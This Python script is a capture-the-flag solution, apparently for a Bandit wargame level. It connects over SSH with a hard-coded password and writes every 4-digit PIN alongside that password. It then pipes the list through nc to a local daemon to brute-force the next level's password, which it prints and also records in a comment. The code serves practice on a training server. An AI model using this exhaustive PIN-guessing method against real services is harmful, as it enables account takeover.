import os
import sys
sys.path.insert(1, os.path.dirname(os.path.realpath(__file__)) + '/..')

import paramiko
import utils
import uuid

USERNAME = 'bandit24'
PASSWORD = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

print('connecting...\n')
client.connect(hostname=utils.ADDRESS, port=utils.PORT, username=USERNAME, password=PASSWORD)

# generate random foldername
FOLDERNAME = str(uuid.uuid4())
# create a temporary folder to store the password followed by all possible combination of 4-digit codes
client.exec_command(f'mkdir /tmp/{FOLDERNAME}')

FILENAME = str(uuid.uuid4())
# reference: https://unix.stackexchange.com/questions/433559/bash-script-loop-with-zero-paddings-for-the-numbers
# for every 4-digit code from 0000 until 9999
# note: to escape curly braces in f-string, wrap them in another pair, i.e. {{}}
# reference: https://stackoverflow.com/questions/5466451/how-can-i-print-literal-curly-brace-characters-in-python-string-and-also-use-fo
print(f"for i in {{0000..9999}}; do echo {PASSWORD} ${{i}}; done > /tmp/{FOLDERNAME}/{FILENAME}")
client.exec_command(f"for i in {{0000..9999}}; do echo {PASSWORD} ${{i}}; done > /tmp/{FOLDERNAME}/{FILENAME}")
print()

# send every line of the generated file to localhost:30002
print(f'cat /tmp/{FOLDERNAME}/{FILENAME} | nc localhost 30002 | grep "The password "')
# get only the output that contains the password
_, stdout, _ = client.exec_command(f'cat /tmp/{FOLDERNAME}/{FILENAME} | nc localhost 30002 | grep "The password "')
stdout = stdout.readlines()
utils.print_stdout(stdout)
password = utils.get_password(stdout[0].split()[-1])

# bandit25 password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
print(f'bandit25 password: {password}\n')

# cleanup
print('deleting temporary folder...')
client.exec_command(f"rm -r /tmp/{FOLDERNAME}")

client.close()